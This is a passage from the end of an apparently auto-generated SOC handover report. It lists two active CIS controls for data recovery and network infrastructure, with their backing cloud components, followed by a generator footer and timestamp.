| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-05T20:09:03Z_
